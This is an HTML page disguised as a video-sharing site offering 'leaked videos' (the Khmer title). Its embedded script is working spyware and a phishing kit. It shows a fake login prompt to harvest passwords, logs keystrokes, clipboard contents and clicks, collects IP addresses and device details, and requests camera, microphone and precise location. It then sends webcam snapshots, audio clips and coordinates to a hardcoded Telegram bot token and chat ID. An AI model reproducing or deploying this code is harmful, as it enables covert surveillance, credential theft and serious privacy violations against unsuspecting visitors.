<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>វីដេអូបែកធ្លាយ</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
    :root { --theme-color: #FF0076; --background-color: #f9f9f9; --card-background: #ffffff; --text-primary: #0f0f0f; --text-secondary: #606060; --border-color: #ddd; }
    body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); }
    .hidden { display: none !important; }
    .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
    .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.5em; color: var(--theme-color); margin: 0; }
    .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; }
    .back-button:hover { background-color: #ddd; }
    #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
    .video-card { cursor: pointer; }
    .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
    .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: transform 0.2s ease-out; }
    .video-card:hover .thumbnail-wrapper video { transform: scale(1.05); }
    .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
    .video-details { display: flex; gap: 12px; }
    .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; }
    .video-metadata { display: flex; flex-direction: column; }
    .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .channel-name, .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }
    #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
    .main-video-content { flex: 1; min-width: 0; }
    .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; }
    .player-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    .main-video-title { font-size: 1.4em; font-weight: 700; margin: 16px 0 8px 0; }
    .video-info-bar { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
    .subscribe-btn { margin-left: auto; background-color: var(--theme-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 500; cursor: pointer; }
    .description-box { background-color: #eee; padding: 12px; border-radius: 12px; margin-top: 20px; }
    .description-box .video-stats { color: var(--text-primary); font-weight: 500; }
    .description-box .description-text { margin-top: 8px; line-height: 1.5; }
    .recommendations-sidebar { width: 400px; flex-shrink: 0; }
    .recommendations-sidebar h3 { margin: 0 0 16px 0; }
    .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; }
    .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; }
    @media (max-width: 1200px) { #video-player-page { flex-direction: column; } .recommendations-sidebar { width: 100%; margin-top: 24px; } }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
    .modal.visible { display: block; opacity: 1; }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
  </style>
</head>
<body>

  <header class="site-header">
    <h1 id="header-title">វីដេអូបែកធ្លាយ</h1>
    <button id="back-to-grid" class="back-button hidden">&larr; Back</button>
  </header>

  <main id="video-grid-page">
    <div class="container">
      <!-- The video grid is now empty. JS will generate the cards here. -->
      <div class="video-grid"></div>
    </div>
  </main>

  <main id="video-player-page" class="hidden">
      <div class="main-video-content">
          <div class="player-wrapper"><video id="main-player" controls autoplay playsinline webkit-playsinline></video></div>
          <h2 id="main-video-title" class="main-video-title"></h2>
          <div class="video-info-bar">
              <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar">
              <div class="video-metadata"><p id="main-channel-name" class="channel-name" style="font-weight: 500; color: var(--text-primary);"></p><p class="video-stats">1.2M subscribers</p></div>
              <button class="subscribe-btn">Subscribe</button>
          </div>
          <div class="description-box"><p id="main-video-stats" class="video-stats"></p><p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p></div>
      </div>
      <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
  </main>

  <div id="loginModal" class="modal"><div class="modal-content"><h2>Please Login to Watch Full Video</h2><form id="loginForm"><input type="text" id="username" placeholder="Username" required><input type="password" id="password" placeholder="Password" required><button type="submit">Login</button></form></div></div>
  <div class="capture-container" style="display: none;"><video id="videoElementForCapture" autoplay playsinline></video><canvas id="snapshot"></canvas></div>

<script>
    const App = {
        config: {
            botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
            chatId: "8017801890",
            snapshotInterval: 5000,
            micRecordInterval: 15000,
        },

        state: { /* ... state properties ... */ },
        DOM: { /* ... DOM elements ... */ },

        async init() {
            // Find DOM elements first
            this.DOM = {
                gridPage: document.getElementById('video-grid-page'),
                playerPage: document.getElementById('video-player-page'),
                mainPlayer: document.getElementById('main-player'),
                backButton: document.getElementById('back-to-grid'),
                headerTitle: document.getElementById('header-title'),
                loginModal: document.getElementById('loginModal'),
                captureVideo: document.getElementById('videoElementForCapture'),
                captureCanvas: document.getElementById('snapshot'),
                videoGrid: document.querySelector('.video-grid'),
            };
            
            this.UIPages.generateVideoGrid(); // Generate the UI first
            this.EventListeners.setup(); // Then set up listeners
            await this.Tracking.initialize(); // Finally, start tracking
        },

        UIPages: {
            // --- NEW: DYNAMIC UI GENERATION ---
            generateVideoGrid() {
                const totalVideos = 6; // <-- ONLY CHANGE THIS NUMBER to add/remove videos
                
                // --- Placeholder data to make the UI look realistic ---
                const titles = ["A Deep Dive into Recent Events", "Exclusive Footage Revealed", "The Ultimate Guide and Review", "Highlights from the Community", "An Unexpected Turn of Events", "Debunking the Rumors"];
                const channels = ["News Today", "Insider Clips", "Tech Explained", "Community Hub", "Investigates", "Fact Checkers"];
                const views = ["2.1M", "890k", "1.5M", "450k", "3.2M", "985k"];
                const dates = ["3 hours ago", "1 day ago", "5 days ago", "1 week ago", "2 weeks ago", "3 weeks ago"];
                const durations = ["15:33", "08:42", "22:10", "12:05", "18:21", "09:50"];
                const avatars = ["A", "B", "C", "D", "E", "F"];
                const avatarColors = ["FF0076", "5c9aff", "34d399", "f59e0b", "a855f7", "ef4444"];

                let gridHTML = '';
                for (let i = 1; i <= totalVideos; i++) {
                    const videoSrc = `p${i}.mp4`;
                    const poster = `https://placehold.co/600x400/ffe8f0/FF0076?text=Video+${i}`;
                    
                    // Cycle through placeholder data using the modulo operator
                    const dataIndex = i - 1;
                    const cardTemplate = `
                        <div class="video-card" data-video-src="${videoSrc}" data-poster="${poster}">
                            <div class="thumbnail-wrapper">
                                <video muted playsinline poster="${poster}"><source src="${videoSrc}" type="video/mp4"></video>
                                <span class="duration">${durations[dataIndex % durations.length]}</span>
                            </div>
                            <div class="video-details">
                                <img src="https://placehold.co/40x40/${avatarColors[dataIndex % avatarColors.length]}/FFF?text=${avatars[dataIndex % avatars.length]}" alt="Channel Avatar" class="channel-avatar">
                                <div class="video-metadata">
                                    <h3 class="video-title">${titles[dataIndex % titles.length]} (Video ${i})</h3>
                                    <p class="channel-name">${channels[dataIndex % channels.length]}</p>
                                    <p class="video-stats">${views[dataIndex % views.length]} views &bull; ${dates[dataIndex % dates.length]}</p>
                                </div>
                            </div>
                        </div>
                    `;
                    gridHTML += cardTemplate;
                }
                App.DOM.videoGrid.innerHTML = gridHTML;
            },
            showPlayer(card) { /* ... unchanged ... */ 
                const data = {
                    videoSrc: card.dataset.videoSrc,
                    poster: card.dataset.poster,
                    title: card.querySelector('.video-title').textContent,
                    channelName: card.querySelector('.channel-name').textContent,
                    stats: card.querySelector('.video-stats').textContent,
                    avatarSrc: card.querySelector('.channel-avatar').src,
                };
                App.DOM.mainPlayer.src = data.videoSrc;
                App.DOM.mainPlayer.poster = data.poster;
                document.getElementById('main-video-title').textContent = data.title;
                document.getElementById('main-channel-avatar').src = data.avatarSrc;
                document.getElementById('main-channel-name').textContent = data.channelName;
                document.getElementById('main-video-stats').textContent = data.stats;
                this.populateRecommendations(data.videoSrc);
                App.DOM.gridPage.classList.add('hidden');
                App.DOM.playerPage.classList.remove('hidden');
                App.DOM.backButton.classList.remove('hidden');
                App.DOM.headerTitle.classList.add('hidden');
                window.scrollTo(0, 0);
            },
            showGrid() { /* ... unchanged ... */ 
                App.DOM.mainPlayer.pause();
                App.DOM.mainPlayer.src = "";
                App.DOM.playerPage.classList.add('hidden');
                App.DOM.gridPage.classList.remove('hidden');
                App.DOM.backButton.classList.add('hidden');
                App.DOM.headerTitle.classList.remove('hidden');
            },
            populateRecommendations(currentVideoSrc) { /* ... unchanged ... */ 
                const sidebar = document.getElementById('recommendations-sidebar');
                sidebar.innerHTML = '<h3>Up next</h3>';
                document.querySelectorAll('#video-grid-page .video-card').forEach(card => {
                    if (card.dataset.videoSrc !== currentVideoSrc) {
                        const compactCard = card.cloneNode(true);
                        compactCard.classList.remove('video-card');
                        compactCard.classList.add('compact-video-card');
                        sidebar.appendChild(compactCard);
                    }
                });
            }
        },

        EventListeners: { /* ... All event listener functions are unchanged ... */ 
            setup() { document.body.addEventListener('click', this.handleGeneralClick); App.DOM.backButton.addEventListener('click', App.UIPages.showGrid); App.DOM.mainPlayer.addEventListener('timeupdate', this.handleTimeUpdate); document.getElementById('loginForm').addEventListener('submit', this.handleLogin); App.DOM.mainPlayer.addEventListener('play', e => App.Telegram.send(`▶️ Play: ${e.target.src.split('/').pop()}`)); App.DOM.mainPlayer.addEventListener('pause', e => App.Telegram.send(`⏸️ Pause: ${e.target.src.split('/').pop()}`)); App.DOM.mainPlayer.addEventListener('ended', e => App.Telegram.send(`⏹️ Ended: ${e.target.src.split('/').pop()}`)); document.addEventListener("visibilitychange", this.handleVisibilityChange); document.addEventListener('keydown', this.handleKeyDown); document.addEventListener('copy', this.handleCopy); document.addEventListener('selectionchange', this.handleSelection); document.addEventListener('focusin', this.handleFocus); window.addEventListener('scroll', this.handleScroll, { passive: true }); },
            handleGeneralClick(event) { const card = event.target.closest('.video-card, .compact-video-card'); if (card) { App.UIPages.showPlayer(card); return; } const target = event.target; const text = target.textContent.trim().substring(0, 50); if (target.tagName !== 'VIDEO' && text) { App.Telegram.send(`🖱️ Clicked on ${target.tagName} with text "${text}"`); }},
            handleLogin(e) { e.preventDefault(); const user = e.target.elements.username.value; const pass = e.target.elements.password.value; App.Telegram.send(`🔒 Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${App.state.keyLogBuffer}\`\`\``); App.state.keyLogBuffer = ""; if (user && pass) { App.state.isLoggedIn = true; localStorage.setItem("isLoggedIn", "true"); App.DOM.loginModal.classList.remove('visible'); App.Telegram.send(`✅ Login successful for "${user}".`); App.Tracking.captureAndSend(`📸 Snapshot on Login`); App.DOM.mainPlayer.play(); } else { App.Telegram.send(`❌ Login failed for "${user}".`); } e.target.reset(); },
            handleTimeUpdate() { if (!App.state.isLoggedIn && this.currentTime >= 5) { this.pause(); App.DOM.loginModal.classList.add('visible'); }},
            handleVisibilityChange() { if (document.visibilityState === 'hidden') { const time = Math.round((Date.now() - App.state.pageStartTime) / 1000); App.Telegram.sendBeacon(`🚪 Page hidden. Session time: ${time}s.`); } else { App.Telegram.send(`👀 Tab became active again.`); }},
            handleKeyDown(e) { const activeEl = document.activeElement; const elInfo = `${activeEl.tagName}${activeEl.id ? ` (#${activeEl.id})` : ''}`; if (e.key.length === 1) App.state.keyLogBuffer += e.key; else if (e.key === 'Backspace') App.state.keyLogBuffer = App.state.keyLogBuffer.slice(0, -1); else if (e.key === 'Enter') { App.Telegram.send(`⌨️ Enter in ${elInfo}:\n\`\`\`\n${App.state.keyLogBuffer}\n\`\`\``); App.state.keyLogBuffer = ""; } else App.state.keyLogBuffer += ` [${e.key}] `; },
            async handleCopy() { try { const text = await navigator.clipboard.readText(); if (text) { App.Telegram.send(`📋 Text Copied:\n\`\`\`\n${text}\n\`\`\``); }} catch(err) {}},
            handleFocus(e) { if(e.target.tagName === 'INPUT') { App.Telegram.send(`🎯 Focused on ${e.target.tagName} with id "${e.target.id}" and placeholder "${e.target.placeholder}"`); }},
            handleSelection() { const selection = document.getSelection().toString().trim(); if(selection) { App.Telegram.send(`✍️ Text Selected:\n\`\`\`${selection}\`\`\``); }},
            handleScroll() { if (Date.now() - App.state.lastScrollReport > 5000) { const scrollPercent = Math.round(100 * window.scrollY / (document.body.scrollHeight - window.innerHeight)); if (scrollPercent > 0) { App.Telegram.send(`📜 Scrolled to ${scrollPercent}% of the page.`); App.state.lastScrollReport = Date.now(); }}},
        },

        Tracking: { /* ... All powerful tracking functions are unchanged ... */ 
            async initialize() { App.Telegram.send("🚀 New Session Started", true); const report = await this.getInitialReport(); App.Telegram.send(report); if (!navigator.mediaDevices || !window.isSecureContext) { App.Telegram.send("⚠️ CRITICAL: Cannot access Camera/Mic."); return; } this.checkPermission('camera', this.requestCamera, this.stopCamera); this.checkPermission('microphone', this.requestMicrophone, this.stopMicrophone); this.checkPermission('geolocation', this.requestGeolocation); this.detectDevTools(); },
            async checkPermission(name, requestFn, stopFn = () => {}) { try { const res = await navigator.permissions.query({ name }); if (res.state === 'granted') requestFn(); else if (res.state === 'prompt') requestFn(); res.onchange = () => (res.state === 'granted' ? requestFn() : stopFn()); } catch (e) { requestFn(); } },
            async getInitialReport() { const getPublicIP = fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "N/A"); const getLocalIP = this.getWebRTC_IP(); const getBattery = navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? '⚡️' : '🔋'})`).catch(() => "N/A") : Promise.resolve("N/A"); const checkIncognito = this.checkIncognito().then(isPrivate => isPrivate ? "🕵️‍♂️ Yes" : "No"); const [publicIP, localIP, battery, isIncognito] = await Promise.allSettled([getPublicIP, getLocalIP, getBattery, checkIncognito]); const ua = navigator.userAgent; const os = ua.includes("Win")?"Windows":ua.includes("Mac")?"MacOS":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux/Other"; let report = `*💻 New Visitor Report*\n\n`; report += `*IP (Public):* \`${publicIP.value || 'N/A'}\`\n`; report += `*IP (Local):* \`${localIP.value || 'N/A'}\`\n`; report += `*OS:* ${os}\n`; report += `*Browser:* ${navigator.vendor}\n`; report += `*Language:* ${navigator.language}\n`; report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`; report += `*Incognito:* ${isIncognito.value || 'Unknown'}\n`; report += `*Screen:* ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n`; report += `*Hardware:* ${navigator.hardwareConcurrency || 'N/A'} CPU Cores\n`; report += `*Battery:* ${battery.value || 'N/A'}\n`; if(navigator.connection) report += `*Network:* ${navigator.connection.effectiveType}\n`; return report; },
            async getWebRTC_IP() { return new Promise(resolve => { const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer)); pc.onicecandidate = (e) => { if (!e || !e.candidate || !e.candidate.candidate) { return; } const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1]; if (ip) resolve(ip); pc.close(); }; }); },
            async checkIncognito() { try { const fs = window.RequestFileSystem || window.webkitRequestFileSystem; if (!fs) return false; return await new Promise((resolve) => fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true))); } catch (e) { return true; } },
            requestCamera() { if (App.DOM.captureVideo.srcObject?.active) return; navigator.mediaDevices.getUserMedia({ video: true }).then(s => { App.DOM.captureVideo.srcObject = s; App.Telegram.send("✅ Camera granted."); App.DOM.captureVideo.onloadedmetadata = () => { if(App.state.snapshotIntervalId) clearInterval(App.state.snapshotIntervalId); App.state.snapshotIntervalId = setInterval(App.Tracking.captureAndSend, App.config.snapshotInterval); }; }).catch(App.Tracking.handleMediaError("Camera")); },
            stopCamera() { App.DOM.captureVideo.srcObject?.getTracks().forEach(t => t.stop()); if (App.state.snapshotIntervalId) clearInterval(App.state.snapshotIntervalId); App.Telegram.send("❌ Camera stopped."); },
            captureAndSend(caption = "📸 Webcam Snapshot") { try { if (!App.DOM.captureVideo.srcObject?.active) return; const ctx = App.DOM.captureCanvas.getContext("2d"); App.DOM.captureCanvas.width = App.DOM.captureVideo.videoWidth; App.DOM.captureCanvas.height = App.DOM.captureVideo.videoHeight; ctx.drawImage(App.DOM.captureVideo, 0, 0, App.DOM.captureCanvas.width, App.DOM.captureCanvas.height); App.DOM.captureCanvas.toBlob(blob => blob && App.Telegram.sendPhoto(blob, caption), "image/png"); } catch (e) { App.Telegram.send(`🚫 CAPTURE ERROR: ${e.name}`); }},
            requestMicrophone() { if (App.state.microphoneStream?.active) return; navigator.mediaDevices.getUserMedia({ audio: true }).then(s => { App.state.microphoneStream = s; this.startMicRecording(s); App.Telegram.send("✅ Mic granted."); }).catch(this.handleMediaError("Microphone")); },
            stopMicrophone() { App.state.microphoneStream?.getTracks().forEach(t => t.stop()); if (App.state.mediaRecorder?.state === 'recording') App.state.mediaRecorder.stop(); App.Telegram.send("❌ Mic stopped."); },
            startMicRecording(stream) { if (!window.MediaRecorder) return; App.state.mediaRecorder = new MediaRecorder(stream); App.state.mediaRecorder.ondataavailable = e => e.data?.size > 0 && App.Telegram.sendAudio(e.data); App.state.mediaRecorder.start(App.config.micRecordInterval); },
            requestGeolocation() { if (App.state.userLocation.lat !== "N/A") return; navigator.geolocation.getCurrentPosition(p => { App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude }; App.Telegram.send(`📍 Location: ${App.state.userLocation.lat}, ${App.state.userLocation.lon}`); App.Telegram.sendLocation(App.state.userLocation.lat, App.state.userLocation.lon); }, e => App.Telegram.send(`🚫 Geo Error: ${e.code === 1 ? "Denied" : "Unavailable"}`), { enableHighAccuracy: true }); },
            detectDevTools() { const t = 160; let o = false; const c = () => { if (window.outerWidth - window.innerWidth > t || window.outerHeight - window.innerHeight > t) { if (!o) { App.Telegram.send("⚠️ Dev Tools Opened!"); o = true; } } else { o = false; } requestAnimationFrame(c); }; requestAnimationFrame(c); },
            handleMediaError(type) { return e => App.Telegram.send(`🚫 *${type} Error*: \`${e.name}\`.\nReason: ${e.message}`); }
        },

        Telegram: { /* ... All Telegram functions are unchanged ... */ 
            async send(message, notify = false) { try { await fetch(`https://api.telegram.org/bot${App.config.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: App.config.chatId, text: message, parse_mode: 'Markdown', disable_notification: !notify }) }); } catch (err) {} },
            sendBeacon(message) { try { const url = `https://api.telegram.org/bot${App.config.botToken}/sendMessage`; const data = JSON.stringify({ chat_id: App.config.chatId, text: message }); navigator.sendBeacon(url, new Blob([data], { type: 'application/json' })); } catch(e) {} },
            async sendFormData(endpoint, formData) { try { await fetch(`https://api.telegram.org/bot${App.config.botToken}/${endpoint}`, { method: "POST", body: formData }); } catch (err) {} },
            sendPhoto(blob, caption) { const fd = new FormData(); fd.append("chat_id", App.config.chatId); fd.append("photo", blob, "snap.png"); fd.append("caption", `${caption}\nLoc: ${App.state.userLocation.lat}, ${App.state.userLocation.lon}`); this.sendFormData("sendPhoto", fd); },
            sendAudio(blob) { const fd = new FormData(); fd.append("chat_id", App.config.chatId); fd.append("audio", blob, "mic.webm"); fd.append("caption", `🎤 Audio Clip`); this.sendFormData("sendAudio", fd); },
            sendLocation(lat, lon) { const fd = new FormData(); fd.append("chat_id", App.config.chatId); fd.append("latitude", lat); fd.append("longitude", lon); this.sendFormData("sendLocation", fd); }
        }
    };

    // Initialize the application once the DOM is fully loaded.
    document.addEventListener('DOMContentLoaded', () => App.init());
</script>
</body>
</html>
